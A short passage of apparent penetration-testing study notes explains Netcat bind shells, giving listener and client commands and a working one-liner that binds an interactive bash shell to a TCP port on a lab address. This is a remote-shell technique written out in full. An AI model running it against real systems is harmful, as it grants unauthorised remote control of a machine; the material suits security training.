> Target system has a listener started and awaits a connection from the pentester's box.

### Server
```bash
nc -nvlp 7777
```

#### Client

```bash
nc -nv <server-ip> 7777
```

- The above mentioned shell is not a proper bind shell, it just allows us to pass text within the pipe setup by Netcat.
#### Server - Binding a Bash shell to the TCP session

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### Client - Connecting to bind shell on target

```bash
nc -nv 10.129.41.200 7777
```
